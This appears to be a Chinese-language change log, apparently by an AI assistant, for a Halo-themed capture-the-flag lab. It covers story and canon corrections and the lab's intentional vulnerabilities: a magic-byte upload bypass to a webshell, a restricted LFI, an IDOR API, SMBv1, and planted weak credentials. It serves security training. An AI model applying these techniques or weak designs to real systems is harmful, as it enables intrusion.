新增的是**純粹用 Act I 現有材料就能拼出來的推理節點**，沒有動任何資安/漏洞機制，也沒有用到 Act II/III 才會出現的資料：

1. 新增一封 webmail 郵件（webmail.py 的 `EMAILS`）：Madrigal 殖民地行政單位的 J. Brandt 追問 Talia Wren 案件（`OCPA-R4-11944`），Records 用跟既有的 V. Dumont/Eli Okafor（`OCPA-R4-11902`）那封幾乎一樣的公式化語言打發，還補一句「這已經是回覆你們單位第二次問一樣的問題了」。原本 V. Dumont 那封信在文件裡只算「填充信件」，這輪重新定義成推理素材的一部分。
2. `attack_chain_design.md` 新增 §2.6【推理節點 0】：把三組獨立線索——(a) 搜尋結果 7 筆裡剛好只有 LONGSHORE 給的 3 筆異常、(b) 三個互不相關的來源對「這只是遷移假影」給出幾乎逐字相同的說法（其中 T. Reyes 自己在私人信裡就已經點出這個異常一致性）、(c) 兩個不同殖民地的行政單位分別為 Okafor、Wren 的案子持續詢問好幾年、每次都被同一套話打發——寫成一個明確的推理節點。結論刻意停在「懷疑」而不是「證據」：玩家這時候還沒有任何能反駁官方說法的實質東西，跟後面 Act II/III 的節點一樣，遊戲不提前劇透。
3. 刻意**不**幫 Dominic Farrow 也加一封對應的殖民地行政公文——三個名字裡故意留一個沒有這條支線，避免「每個名字都剛好對得上一封信」顯得太工整、像是硬湊出來的規律，而不是玩家自己注意到的真實模式。
4. 順手修正一個既有的錯誤章節交叉引用：Act I 原本寫「替後面的官方稽核回應（4.4 節）先埋一個伏筆」，4.4 節其實是 Act III 的「三份 vs 四筆」節點，跟這裡講的官方稽核回應（3.4 節，Act II）是兩個不同的東西——已改成正確的 3.4 節。

已重新 `docker compose build --no-cache frontier` 並實測：新郵件正確出現在 `/inbox`，跟 Dumont 那封一樣能靠 `OCPA-R4-11944` 對回搜尋頁的 Talia Wren 案件；收件匣總數從 17 封變成 18 封，關鍵信從 4 封變成 7 封（新增 Brandt 那封，加上把原本算填充的 Dumont、"you're not going to believe this" 兩封重新定義成推理素材）；全鏈路其餘部分（recon/立足點/RELAY/ARCHIVE）不受影響，沒有重新測試主線技術漏洞，因為這輪完全沒有動任何漏洞機制。

更新的文件：`lab/frontier/app/webmail/webmail.py`（新增一封信）、`story-dev/attack_chain_design.md`（新增 §2.6、更新 Act I 結論、更新信件數量統計、修正 4.4→3.4 的錯誤引用）、`Answer/walkthrough.md`（步驟 7 補上推理節點提示、更新信件數量）、`story-dev/player-knowledge-states.md`（FRONTIER 攻破後新增「推理、非證據」的一條）。

## 第十五輪：六點正史相容性修正

使用者要求讓故事跟 Halo 正史更相容，具體六點：

1. **SPARTAN-II 成立時間**：不再寫成「2516-2517 才決定發起計畫」，改成「代號 2513 年就在 Section III 內部小規模使用（僅理論建模＋少量志願者試驗），2516 年殖民地叛亂風險推估才是把它推向全面徵召的觸發點」，2516-2517 重新定位成「進入正式徵召／執行階段」而不是「發起」。
2. **「SPARTAN-II」名稱首次出現時間**：不再讓 2517 年的 acquisition directive 是名稱第一次出現——`acquisition_directive_excerpt.txt` 改成「這批人員將編入既有的 SPARTAN-II 計畫（Section III 內部代號，2513 年起使用，至今僅限小規模驗證）」。
3. **CPO Kade 的定位**：不再讓他像是取代 Mendez、成為 SPARTAN-II 的主要教官。CAIRN record 104 改成「我是 Chief Mendez 在 Reach 的訓練幹部之一，不是負責整個計畫的人——那從頭到尾都是他的計畫。我自己負責的只是 SPINDLE 名單裡一小群，不是整個梯隊」，`characters.md`/`timeline.md`/`truth-map.md`/`truth-en.md`/`truth-zh.md` 同步改成「Mendez 麾下的訓練幹部」而非「Mendez 類比角色」。
4. **原創候選人名額**：Eli/Talia/Farrow/Voight 明確設定成原本 75 名 SPARTAN-II 候選人裡尚未被正史詳細描述的人（`characters.md`/`truth-map.md`/`truth-en.md`/`truth-zh.md`：「還有七十一個孩子——這一批一共七十五人」），不是額外的第 76、77 人。
5. **成功服役者的 Spartan 編號**：Talia Wren、Samuel Voight 分別給予 Spartan-141、Spartan-156——刻意避開既有正史角色已使用的編號（John-117、Kelly-087、Fred-104、Linda-058、Jorge-052、Kurt-051、Solomon-069、William-043 等），避免日後撞設定。新增進 `casualty_log_partial.txt`（中英文版）、`characters.md`、`truth-en.md`、`truth-zh.md`。
6. **Dr. Castel 簽多地死亡證明**：改成本地醫師簽死亡證明（各殖民地不知情的一般醫師：Dr. H. Idowu / Eridanus II、Dr. A. Petrides / Madrigal、Dr. T. Marlow / Skopje），Castel 在 ONI Section III 的角色改成計畫端醫療督導，負責事後審核／確認案件檔案結案沒有問題，並不親自到場簽署。CAIRN record 102 改寫成她的自白是「事後審核並簽核了三份案件檔案」；record 105 從兩欄（案件編號/簽署醫師）改成三欄（案件編號/當地簽署醫師/ONI 檔案審核），第四份 Voight 的 ONI 端審核仍是 Dr. R. Achebe——4.4 節「三份 vs 四筆」的推理邏輯本身不變，只是欄位語意從「誰簽的」變成「當地簽的 vs ONI 審核的」。

順手修掉兩個既有的用詞落差（review 時發現，跟本輪主題相關但屬於既有小 bug）：`Answer/walkthrough.md` 步驟 19 把「105（103 提到三份...）」的錯誤交叉引用改成「105（102 提到三份...）」；`characters.md`/`Answer/evidence-map.md` 裡舊的「Castel 說她簽了三份」統一改成「Castel 說她審核簽核了三份」，跟 record 102/105 的新措辭一致。

更新的文件：`lab/archive/app/admin/content_en.py`/`content_zh.py`（record 102/104/105）、`lab/archive/shares/confidential/acquisition_directive_excerpt.txt`＋`shares-zh` 對應版本、`lab/archive/shares/backups/casualty_log_partial.txt`＋`shares-zh` 對應版本、`Answer/truth-en.md`、`Answer/truth-zh.md`、`story-dev/truth-map.md`、`story-dev/timeline.md`、`story-dev/characters.md`、`story-dev/attack_chain_design.md`（§4.4、附錄 C 摘要、CAIRN 六份文件表格的 102 一行）、`Answer/walkthrough.md`（步驟 19）、`Answer/evidence-map.md`（record 105 一行）。英文版、中文版 archive 皆已 `--no-cache` 重建並透過完整 pivot 鏈實測 record 102/104/105 與兩份 SMB 檔案渲染正確（中文版透過 relay pivot + curl 驗證 dashboard 標題跟三份 record 內容，另外直接檢查了容器內 SMB 分享檔案）。遊戲機制、帳密、`transfer_ref`、案件編號、SQL/PATH-hijack 等所有漏洞邏輯完全沒有變動，這輪純粹是敘事文字修正。

## 第十六輪：Act I「追查 → 找漏洞」因果重整 + 密碼線索拆分

使用者反饋核心：玩家不該是因為「這是 CTF，看到 upload 就測」而去打漏洞，而是因為想追查委託信裡三個孩子的死因，被系統正常權限擋下來，才被迫越權；技術難度完全不用變，只是玩家抵達每個漏洞的「理由」要換成調查動機。具體採納的改動（純文字/資料/檔案配置，沒有新增或修改任何漏洞機制）：

1. **案件卡直接顯示異常，不用先看 Support Tickets 才知道**：`$DEPENDENT_INDEX`（frontier 案件搜尋後端）替 Okafor/Wren/Farrow 三筆新增 `transfer_ref` 欄位（`SPINDLE-7-0119`/`-0142`/`-0087`，沿用 relay 既有的值），顯示在搜尋結果卡跟詳細頁上；其他 4 筆對照組完全沒有這個欄位。玩家查詢委託信給的三個名字時，異常是自己第一手看到的，不是被動被工單告知。`todo.txt` 順手修正一個既有的用詞不精確：原本寫「三筆案件都指向同一個 transfer reference」，但三筆的值其實各自不同（都是 SPINDLE-7-xxxx 格式，不是同一個值）——改成準確的說法：「這 3 筆是整個索引裡唯一這欄還有值的已結案案件」。
2. **Case File Intake（upload）重新框成「案件文件的唯一入口」**：`upload_intro` 跟首頁系統公告的文字改寫，明講這是案件結案後唯一還能補件的管道，讓玩家測試這個功能的理由變成「想知道這三筆案件的原始資料能不能透過這裡拿到更多」，而不是單純「有上傳功能，CTF 慣例就是測」。底層的 `getimagesize()` magic-byte bypass 漏洞本身完全沒有變。
3. **第一次 shell 後立刻有故事回饋**：新增 `/var/backups/roster/reyes_scratch.txt`——不在 `/var/www/html/portal/` webroot 底下（nginx 不服務這個路徑），`?page=notes&file=` 的 LFI 也因為 `basename()` 限制構造性地碰不到（`../` 會被收斂回 `notes/` 目錄內），只有真的拿到程式碼執行才讀得到。內容是 T. Reyes 自己的私人筆記，確認案件卡上那個異常欄位是真的、只有這 3 筆已結案案件有、其他都是空的——玩家在拿到第一個 shell 後幾秒內就得到一個「只有突破後才確認得到」的故事事實，形成正回饋，不只是技術上的立足點。中英文版都有（`private/`、`private-zh/`，比照 `notes`/`notes-zh` 的 Dockerfile build-time 語言選擇模式）。
4. **密碼線索拆成兩份文件，玩家自己做一步推論**：`credential_rotation_status.txt` 不再直接寫出 `sysadmin:admin123` 明文，只講「`sysadmin` 沒有經過 first-login 輪替，還在用 provisioning 範本的預設值」；範本預設值本身（`admin123`，跟任何特定帳號無關的通用政策）搬到 `welcome.txt` 一句新增的話裡。玩家要把兩份獨立文件的資訊接起來才能推出完整帳密——沒有增加任何猜測/解謎成分，兩份文件都直接讀得到，純粹把「設計者把鑰匙放在一個檔案裡」的體感換成「玩家自己推論出來的」。

順手修正兩個既有的小問題：`Answer/evidence-map.md` 裡 `credential_rotation_status.txt` 那一行描述的是舊版設計（「不小心貼上 useradd/chpasswd 腳本」），跟目前檔案實際內容（一張輪替狀態表）對不上，已改寫成符合現況、並反映本輪的兩文件拆分；上一輪（第十五輪）結尾寫「中文版 archive 已重建但尚待實測」，本輪已實際完成中文版 archive 的 pivot 鏈實測，一併更新成完成狀態。

已用真實漏洞路徑實測（不是只看程式碼）：真的用 GIF89a polyglot 上傳 webshell 拿到 `uid=33(www-data)`，再用這個 shell `cat /var/backups/roster/reyes_scratch.txt` 讀到新文件；確認同一個路徑用 `curl` 直接打會 404（不在 webroot），用 `?page=notes&file=../../../backups/roster/reyes_scratch.txt` 打 LFI 也讀不到（`basename()` 擋住）。中英文版 frontier 都已 `--no-cache` 重建並個別驗證過新欄位、新文字、新檔案。

更新的文件：`lab/frontier/app/portal/content_en.php`/`content_zh.php`（`transfer_ref` 欄位、`field_transfer_ref` 標籤、`upload_intro`/`notice_7` 改寫）、`lab/frontier/app/portal/index.php`（顯示 `transfer_ref` 欄位）、`lab/frontier/app/portal/notes/welcome.txt`＋`notes-zh` 對應版本（新增範本預設密碼段落）、`lab/frontier/app/portal/notes/credential_rotation_status.txt`＋`notes-zh` 對應版本（移除明文密碼）、`lab/frontier/app/portal/notes/todo.txt`＋`notes-zh` 對應版本（修正用詞）、`lab/frontier/private/reyes_scratch.txt`＋`private-zh/reyes_scratch.txt`（新檔案）、`lab/frontier/Dockerfile`（COPY + 語言選擇 + 權限設定）、`story-dev/attack_chain_design.md`（§2.2/2.3/2.4、附錄 B）、`Answer/walkthrough.md`（步驟 2/3/4/5）、`Answer/evidence-map.md`（本節＋既有證據列表更新）。

## 第十七輪：清掉六個過期/冗餘的技術細節

使用者一次列了六點技術面的要求，全部是「文件跟程式碼對不上」或「機制設計得不夠精確」的問題，不涉及劇情：

1. **清掉所有還在講 SQLi「存在」的 comment / Appendix**：`admin_panel.py` 早在第十三輪就把登入查詢改成參數化查詢，SQLi 已經徹底消失，但檔案裡留了兩處過期殘留——檔頭 `# nosemgrep`（當年為了壓下 SQLi 的 semgrep 警告，現在已經沒有意義）跟 `VALID_SESSIONS` 上方一句提到「password-field SQLi」的舊註解，都已清掉/改寫。`story-dev/attack_chain_design.md` 附錄 B 也有一整行「CAIRN Records Terminal 的替代路徑 | SQL injection」還當成現存路徑列著，直接刪除——同一份文件其他地方（如 2.5 節前身）其實早就正確寫著「第十三輪移除」，只有這個 Appendix 表格漏改。`Answer/evidence-map.md`、`walkthrough.md` 裡提到 SQLi 的地方逐一檢查過，全部都是正確的過去式歷史紀錄（描述第十三輪修了什麼），不需要改。
2. **FRONTIER 的兩份 search XSS 舊線索改成明確的歷史工單**：`welcome.txt`（「search 頁面還會直接輸出、沒有跳脫」）跟 `todo.txt`（「把 search 欄位的輸出跳脫掉，這次真的要做」）都還把 XSS 寫成待辦/現在式，但 `index.php` 的 `htmlspecialchars($query)` 早就修掉了——這兩份文件變成指向一個不存在的漏洞的死線索。改成明確帶工單編號的已結案敘述（`SEC-1204`，`welcome.txt` 講成「以前會這樣、已經修了」，`todo.txt` 打勾標記 `[x]`），中英文版都改。
3. **`/api/cases`（relay 列表）改成有限 summary，讓 `/:id` 真的形成 IDOR**：原本列表端點直接把每筆完整內容（含 `transfer_ref`、id 5 的 `api_key`）一次全倒出來，`/api/cases/:id` 的「無授權檢查」形同虛設——列表本身就已經給了一切。改成列表只回傳 `id`/`name`/`colony`（系統帳號那筆只回 `id`/`type`），完整內容只有查詢特定 id 才拿得到。設計文件其實一直是照「先看列表摘要、再逐一查 id 拿細節」寫的，這次是把程式碼改成符合文件早就講好的設計，不是改設計本身。
4. **webmail `/debug` 與未驗證的 `/inbox`，只留跟故事有關的那條**：這兩個原本都是「不用密碼就能讀信箱」的路——`/debug` 洩漏一組從沒被用在任何地方的次要帳密 `duty.admin/MailP@ss2024`；`/inbox` 完全沒有 session 驗證，直接 GET 就能看，讓 credential_rotation_status.txt + welcome.txt 兩份文件辛苦推出來的 `sysadmin/admin123` 變得可有可無。兩條都清掉：`/debug` 端點整個移除，連同 Dockerfile 裡只為了餵它的三個 stale env var 一起拔掉；`/inbox` 補上跟 CAIRN Records Terminal 同一套 session cookie 機制，沒有有效 cookie 一律 302 回登入頁。現在讀信箱唯一的路，就是那組故事相關的密碼重用憑證。
5. **「玩家不知道 SPARTAN-II」改成「玩家不知道案件與 SPARTAN-II 有關」**：這批背景介紹頁（第十六輪加的三頁 Halo primer）已經明講 SPARTAN-II 是戰後公開的英雄象徵，玩家理所當然聽過這個名字——真正沒被揭露的是「這三個死去的六歲小孩，跟這個名字有關係」。`player-knowledge-states.md`（開場、FRONTIER 攻破後、RELAY 攻破後三處）、`attack_chain_design.md`（Act I/II 結論兩處）、`BLACK_ARCHIVE_Modification_Plan.md`（一處，另一處本來就是對的）全部同步改成這個更精確的講法。
6. **flash-clone「engineered to fail」改成「已知的技術限制，不是刻意打造的缺陷」**：查證過 Halo 正史——SPARTAN-II 計畫用來頂替候選人的 flash clone，正史裡講的是全身式 flash-cloning 這項技術本身就已知無法長期存活（急速培養導致的固有限制），ONI 是利用這個既有的技術限制，不是特地為了這個目的去設計一個會失敗的缺陷。原本的「engineered to fail」措辭意味著刻意的謀殺工程，跟正史對不上，也讓這件事讀起來比正史更誇張。改完之後反而更冷血：他們甚至不需要特別設計什麼，只是拿現成的技術限制來用。CAIRN record 102（中英文）、`truth-en.md`、`truth-zh.md`、`truth-map.md` 全部同步改寫。

全部改完後重新 `--no-cache` 建置 frontier/relay/archive（中英文版都建），並用真實漏洞路徑逐項實測：archive 端 SQLi payload（username 欄位、password 欄位）現在都回 200（拒絕），合法帳密仍回 302；relay `/api/cases` 確認只回摘要，`/api/cases/1`、`/api/cases/5` 確認回完整內容；webmail `/debug` 確認 404，`/inbox` 沒有 cookie 確認 302，登入後帶 cookie 確認 200；record 102 新措辭確認正確渲染。中英文版全部測過一輪。順手發現並修正一個連帶問題：移除 webmail 的 `/debug` 跟 `/inbox` 未驗證路徑後，`walkthrough.md` 原本的步驟 6（Webmail /debug）跟步驟 7（Webmail 登入）合併成新的步驟 6，後續步驟 7-21 全部重新編號成 6-20（比照第十三輪處理步驟編號變動的先例），文中僅有的一處步驟交叉引用（「見 8.」）也同步修正。

更新的文件：`lab/archive/app/admin/admin_panel.py`（清掉 SQLi 殘留註解）、`lab/relay/app/api/server.js`（`/api/cases` 改摘要）、`lab/frontier/app/webmail/webmail.py`（移除 `/debug`，`/inbox` 加 session）、`lab/frontier/Dockerfile`（移除三個 stale env var）、`lab/frontier/app/portal/notes/{welcome,todo}.txt` ＋ `notes-zh` 對應版本、`lab/archive/app/admin/content_en.py`/`content_zh.py`（record 102）、`Answer/truth-en.md`、`Answer/truth-zh.md`、`story-dev/truth-map.md`、`story-dev/player-knowledge-states.md`、`story-dev/attack_chain_design.md`（§2.5、§3.2、附錄 B）、`Answer/walkthrough.md`（步驟重新編號 1-20）、`BLACK_ARCHIVE_Modification_Plan.md`。

## 第十八輪：四點技術/正史細節校正

使用者列了四點，要求先查證再改：

1. **`/api/health` 洩漏 `cairn.internal:445` 太直接**：這個 endpoint 完全不用認證、關卡最早期就打得到，直接把下一台主機的完整位址交出來，比 3.3/3.3b 節 MariaDB `service_accounts` 表跟 `/etc/ledger/sync.conf` 這兩個「正規」發現管道還早、還輕鬆——查過這兩個管道本來就會給出一模一樣的 `cairn.internal`，`/api/health` 是純粹的多餘捷徑。改成只回報 `internal_services.archive_fileshare: "degraded"`，不再給 hostname/port，真正的位址只能靠站穩 relay 之後查 MariaDB 或本機檔案系統才拿得到。
2. **`smbclient -m NT1` 是否為相容性問題**：查過 `lab/archive/config/smb.conf`，`server min protocol = NT1` 是明確標註「Intentionally weak: allow SMBv1」的刻意設計，不是不小心。這個環境裡的 `smbclient` 也已經在這個 session 裡實測多次成功用 `-m NT1` 連上，不是打不通。**查證結果：屬實但不是 bug，是刻意設計，維持原樣不動。**
3. **SPARTAN-II 公開時間措辭**：原本寫成「2552 年星盟戰爭結束後這批人成為公開英雄」，暗示公開發生在戰爭結束當下，跟正史裡 UNSC 在戰爭期間就已經拿 Spartan 戰績做士氣宣傳/招募素材、逐步建立公眾形象的設定不符。改成「至少從 2547 年起就已經是公開的存在，UNSC 拿來做宣傳，2552 年戰爭結束後只是形象更普及，不是這時候才第一次公開」——`truth-en.md`、`truth-zh.md`、`timeline.md`、`truth-map.md`、`attack_chain_design.md` 附錄 C 全部同步改寫。
4. **「玩家不知道 ONI」改成「不知道 ONI 涉入此案／不知道 Section III」**：上一輪（第十七輪）改的措辭把 ONI 寫成「這個單位本身」玩家完全不知道，但 ONI（海軍情報局）本身是公開存在的 UNSC 情報機構，不應該設定成沒人聽過——沒被揭露的是「ONI 涉入這起案件」跟「Section III 這個內部單位」的存在。`player-knowledge-states.md`（開場、FRONTIER 攻破後兩處）、`attack_chain_design.md`（Act I 結論）同步修正。

已重新 `--no-cache` 建置 relay（中英文版都建）並實測：`/api/health` 確認只回 `"degraded"`，不再有 `cairn.internal:445`；SMB `-m NT1` 維持原樣，不動。

更新的文件：`lab/relay/app/api/server.js`（`/api/health`）、`Answer/truth-en.md`、`Answer/truth-zh.md`、`story-dev/timeline.md`、`story-dev/truth-map.md`、`story-dev/attack_chain_design.md`（§3.2、附錄 C）、`story-dev/player-knowledge-states.md`（ONI 措辭）、`Answer/walkthrough.md`（步驟 8）。

## 第十九輪：一個意外捷徑、一組帳號設計問題、兩個文件 bug、一個 Halo canon 撞號、一次更早的正史起源修正

使用者這次的報告最重要的一條是「CAIRN 有一個意外捷徑，優先修」，接著列了共八項，全部照順序處理：

1. **CAIRN 的 `operator/operator123` 是一個真的意外捷徑**：`admin_panel.py` 的 `init_db()` 除了預定的 `administrator/Records!Access99`，還建了一個 `operator/operator123`；但 session 發放完全不檢查 `role` 欄位，`operator` 登入後拿到的 session 跟 `administrator` 一模一樣，能讀全部 `/records/*`。這代表玩家只要猜到一組弱密碼，就能完全跳過 3.3b 節設計好的 `sync.conf` credential-discovery。**修法：直接刪掉 `operator` 這個帳號**，不做部分權限（本作沒有其他地方用得到真正的 RBAC，加一半的角色檢查只會製造沒有回報的複雜度）。
2. **`devuser`/`deploy` 跟劇情文件矛盾，還形成另一條捷徑**：`credential_rotation_status.txt` 明講 `devuser` 已輪替、舊密碼失效，`deploy` 已停用；但 `lab/base/Dockerfile` 過去統一在**每一台**主機上都建立 `sysadmin`/`devuser`/`backup`/`deploy` 四組真實帳號，密碼都是文件裡提到的那些。更嚴重的是 webmail 的 `USERS` 字典直接接受 `devuser/devuser2024`，登入後看到的是跟 `sysadmin` 完全相同的 18 封信——等於 4. 步驟辛苦推出來的 `sysadmin/admin123` 變得可有可無，而且 `devuser`/`deploy` 在 relay、archive 上也都有真的可用 SSH（archive 的 SSH 密碼認證有另外關掉，relay 沒有，是真的可以直接跳過整個 pivot 推理鏈）。**修法**：`lab/base/Dockerfile` 現在只建立 `sysadmin`（唯一真正需要跨主機共用的帳號）；`devuser`／`deploy` 完全不再建立，`backup`（relay 自己的「Gateway Maintenance SSH」，有獨立的 `service_accounts` 發現管道，維持不動）改成在 `lab/relay/Dockerfile` 自己建立，不再統一從 base 灌進每一台主機。`lab/frontier/app/webmail/webmail.py` 的 `USERS` 字典移除 `devuser`，只留 `sysadmin`。
3. **`Answer/walkthrough.md` 的 MariaDB 說明寫錯**：原本寫「`-h 127.0.0.1`／本機 socket 會免密碼過」，但 `-h 127.0.0.1` 本身就是走 TCP，不是 Unix socket；真正會觸發免密碼的是**省略 `-h`（或用 `localhost`）**時預設連上的 local Unix socket，MariaDB 的 `unix_socket` 認證外掛可能讓本機使用者不用密碼就過。`story-dev/attack_chain_design.md` §3.3 原本的說法其實是對的（只是 walkthrough 沒有照抄對），已改成跟設計文件一致：一定要 `-h 127.0.0.1`（或 `--protocol=tcp`）才是真的驗證到密碼。
4. **`Answer/walkthrough.md` 的 CAIRN cookie 步驟照打會出錯**：Step 6（webmail 登入）把 cookie 存進 `cookie.txt`；原本的 Step 17（CAIRN 登入）測試指令完全沒有 `-c` 存 cookie；Step 18 卻拿 `cookie.txt`（webmail 那份，不同主機、不同 session）去讀 CAIRN 的 `/dashboard`，實際照打不會通。另外 Step 17 寫「帳密是 14. 找到的」，但實際是 10.（`sync.conf`）找到的，不是 14.（SMB confidential share）。**修法**：CAIRN 登入改成 `-c cairn_cookies.txt`，dashboard/records 一律 `-b cairn_cookies.txt`，跟 webmail 的 `cookie.txt` 分開；步驟號碼引用改回正確的 10.。已用 relay shell 實際照著修正後的指令跑過一遍，登入回 302、帶著 `cairn_cookies.txt` 讀 `/dashboard` 回 200，確認可行。
5. **Halo canon 撞號：Spartan-141**：查證過 Halopedia——Cal-141 是正史真實角色，2517 年被 SPARTAN-II 計畫徵召（跟本作候選人同一年），2544 年 Operation GREY VEIL 陣亡，直接撞上 Talia Wren 的編號。
6. **Spartan-156 超出正史編號池上限**：查證過 Halopedia——正史 SPARTAN-II 候選人池是 001–150（150 名候選人裡選出 75 名實際徵召），Edgar-150 是目前已知最高編號的候選人，156 已經超出這個池子的範圍，不可能是真的候選人編號。第 5、6 點修法：把 Talia Wren、Samuel Voight 的編號改成 Spartan-108、Spartan-128——同樣查過 Halopedia 上完整的正史候選人命名列表，確認 108、128 兩個編號目前沒有任何已知角色使用。
7. **2511–2517 的 SPARTAN-II 前史跟 canon 有出入**：原本寫成「2513 年只是理論建模＋少量志願者試驗，直到 2516 年風險評估才轉成兒童計畫」，但查證過 Halopedia——Generation II ORION 在 2511 年正式啟動並改名 SPARTAN-II，從一開始核心就是鎖定基因/認知條件符合的殖民地兒童，不是先做成人試驗再轉向；候選人篩選（比對外環殖民地疫苗接種計畫的基因紀錄）從 2511 年起持續進行，逐步累積到 150 名候選人，2517 年才從中選出 75 名正式徵召。canon 沒有任何「2516 年」的特定事件。**修法**：起源年份從 2513 改成 2511，措辭改成「從一開始就是兒童計畫」；保留本作原創的 2516 年 Section III 內部審查事件（`acquisition_directive_excerpt.txt` 裡「2516 修訂版」這個說法本來就暗示更早有初版，這次不用改遊戲內文件本身），但明確改寫成「對已在跑的計畫做一次內部再確認」，不再框成「兒童徵召計畫的起點」。`acquisition_directive_excerpt.txt`（中英文）、`truth-en.md`、`truth-zh.md`、`truth-map.md`、`timeline.md`、`characters.md`、`attack_chain_design.md` 全部同步。

次要清理（使用者一併提出，順手做掉）：
8. **RELAY Dockerfile 的 `/home/sysadmin/.ssh chmod 777`**：註解稱是「writable authorized_keys misconfig」，但 OpenSSH 預設 `StrictModes yes` 本來就會拒絕權限過寬的 `.ssh` 目錄，這條路本來就打不通，也不服務主線（relay 全程用密碼認證，不是 SSH key）。直接整段刪除，不留一個看起來像攻擊面、實際上不是的東西。
9. **FRONTIER `/server-status`**：`stub_status on` 洩漏 nginx 連線統計，但沒有提供任何獨有的故事線索，純粹是舊 VulnCastle 遺留的資訊洩漏示範。依「一條有意義的攻擊鏈」原則直接拔掉，避免玩家把它當成必查線索繞路。
10. **`start.sh` 的健康檢查一律吞掉失敗**：`check_port` 失敗時原本 `|| true`，最後不管實際檢查結果一律印「BLACK ARCHIVE is running.」，啟動真的失敗時會誤導維護者去別處找問題。改成用 `health_ok` 旗標追蹤檢查結果，失敗時改印紅字警告並提示看 `docker compose logs`。

已重新建置 `black-archive-base`（只建立 `sysadmin`）、frontier/relay/archive（中英文版都 `--no-cache` 重建），並逐項實測：`operator` 登入 CAIRN 確認回 200（拒絕），合法帳密仍 302；`devuser/devuser2024` 登入 webmail 確認回「Invalid credentials」，`sysadmin/admin123` 仍正常；`docker exec` 進三台主機的 `/etc/passwd` 逐一確認 `devuser`/`deploy` 已完全不存在，frontier 只有 `sysadmin`，relay 有 `sysadmin`+`backup`（`passwd -S` 確認 `backup` 密碼狀態跟 `sysadmin` 一致、真的可登入），archive 只有 `sysadmin`（外加 Ubuntu 內建無法登入的系統 `backup`，無影響）；`/server-status` 確認 404；修正後的 CAIRN cookie 指令組實際在 relay shell 裡跑過一遍，登入 302、帶 cookie 讀 dashboard 200；archive 的新版 `acquisition_directive_excerpt.txt` 跟 `casualty_log_partial.txt`（新編號 108/128）中英文版都重新用 pivot 鏈讀過一次，內容正確。

更新的文件：`lab/archive/app/admin/admin_panel.py`（移除 `operator`）、`lab/base/Dockerfile`（只留 `sysadmin`）、`lab/relay/Dockerfile`（新增 `backup`、移除 `.ssh chmod 777`）、`lab/frontier/app/webmail/webmail.py`（移除 `devuser`）、`lab/frontier/config/nginx.conf`（移除 `/server-status`）、`start.sh`（健康檢查失敗改印警告）、`lab/archive/shares/confidential/acquisition_directive_excerpt.txt` ＋ `shares-zh` 對應版本（2511 起源）、`lab/archive/shares/backups/casualty_log_partial.txt` ＋ `shares-zh` 對應版本（Spartan-108/128）、`Answer/truth-en.md`、`Answer/truth-zh.md`、`story-dev/truth-map.md`、`story-dev/timeline.md`、`story-dev/characters.md`、`story-dev/attack_chain_design.md`（附錄 C、§4.6 推理鏈說明）、`Answer/walkthrough.md`（MariaDB 步驟、CAIRN cookie 步驟）。

## 第二十輪：ARCHIVE 後段證據去中心化——拿 root 不等於自動看懂全貌

使用者的方向：保留 FRONTIER→RELAY→ARCHIVE 三階段結構不變，但 ARCHIVE 後段有些文件單獨一份就把好幾個問題一次答完，讓玩家從「推理」滑向「閱讀整理」。要求不是砍線索數量、也不是加密碼/藏字這類傳統 CTF 解謎，而是**降低單份證據的完整度，逼玩家跨文件比對 case_ref、代號、殖民地、時間、人物關係才能自己拼出答案**——07-B/Farrow 的代號還原是現有的正確示範，SPARTAN-II 身分、候選人結果、flash-clone 掩蓋機制也該用同樣的方式逐步拼出。後續使用者再次強調：推理節點的份量要重到 walkthrough 除了 payload 之外的推理說明也要花不小篇幅解釋，但答案不能牽強附會。

盤點過 ARCHIVE 目前所有證據（六份 CAIRN record、三個 SMB 分享的全部文字檔、root 文件）之後，找到兩個真正「單一文件回答過多問題」的地方，其餘（103 Halsey 書信、104 Kade 備忘錄+07-B、105 醫療簽署表、106 低溫轉移、training_roster_fragment.txt、foia_review/dependent_notification 的 LONGSHORE 身分鏈）本來就已經是跨文件才能拼出答案的設計，不用動：

1. **CAIRN record 102（Castel 自白）直接列出三個具體 case_ref**：「I reviewed and signed off on the case files for OCPA-R4-11902, 11944 and 11887」——這其實跟 record 105 的表格完全重複，等於「3 vs 4」推理節點的答案被 102 自己先劇透了一半，玩家只要數 105 的列數就好，不用真的比對兩份文件。**修法**：102 改成只講「事後審核並簽核了三份案件檔案」，不寫是哪三份——玩家要自己拿 105 的表格去對，才能確認是哪三筆、少了哪一筆、那一筆是誰簽的。
2. **`casualty_log_partial.txt`（backups share）把姓名、case_ref、結果、Spartan 編號全部寫在同一行**：「Candidate (case_ref OCPA-R4-11944 / Talia Wren) ... active service, designated Spartan-108」——玩家不用做任何跨文件比對就知道「Talia Wren 現在是 Spartan-108」。**修法**：拆成兩份文件、兩個存取層級。`casualty_log_partial.txt` 只留 case_ref + 結果，拿掉姓名跟編號；Spartan 編號單獨放進**新文件** `spartan_designation_crosscheck.txt`，放在存取權限更高的 confidential share（要 sysadmin 密碼，不是 backups 的 guest 權限），內容是一份法定保留審查的內部比對備忘，只給 case_ref↔現役編號的對照，同樣不寫姓名。玩家要把三樣東西攤開對表才能拼出結論：(a) Act I/II 早就記下的 case_ref↔姓名對照、(b) `casualty_log_partial.txt` 的結果、(c) `spartan_designation_crosscheck.txt` 的編號——三份資料刻意分散在不同存取層級（免密碼的姓名對照、guest 權限的結果、需要認證的編號），沒有任何一份單獨的文件會把「姓名+結果+編號」三件事寫在一起。這個設計沒有硬塞密碼學/藏字：`spartan_designation_crosscheck.txt` 存在的理由本身就是劇情合理的（法定保留審查本來就會做這種交叉比對），案件卡上的「Active service designations are not to be cross-referenced...」這句原本只是氣氛文字，現在變成這份新文件存在的直接理由，答案不是憑空冒出來的。

**沒有動、但值得記錄為什麼保留的部分**：`acquisition_directive_excerpt.txt`（SPARTAN-II 名稱正式出現的那份文件）維持不變——這是 Act III 設計上唯一刻意保留的「一次性重大揭露」，講的是「為什麼帶走、怎麼掩蓋」，不講任何候選人的個別結果，跟候選人結果本來就分屬不同文件（見上），沒有過度集中的問題；root 文件本來就已經是全專案唯一「拿到最高權限也沒有標準答案」的地方（Farrow 的結局），也維持不動。

